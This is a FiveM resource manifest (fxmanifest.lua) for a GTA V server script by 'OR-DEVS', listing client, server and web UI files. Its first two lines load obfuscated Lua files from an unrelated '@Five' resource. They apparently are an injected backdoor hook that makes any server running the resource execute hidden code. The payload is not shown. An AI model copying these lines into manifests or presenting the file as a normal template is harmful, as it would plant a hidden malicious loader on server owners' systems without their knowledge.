shared_script '@Five/ai_module_fg-obfuscated.lua'
shared_script '@Five/shared_fg-obfuscated.lua'
fx_version 'bodacious'
game 'gta5'
author 'OR-DEVS'
discord ''


client_scripts { 
    'config.lua', 
    'client/client.lua', 
    'shared.lua'
 }

server_scripts {  
    '@oxmysql/lib/MySQL.lua',
    'config.lua',
    'server/common.lua',
    'server/server.lua',
    'server/vcheck.lua',
    'shared.lua'
}

ui_page "web/index.html"

files {
    "web/index.html",
    "web/index.js",
    "web/style.css"
}

version "2.0"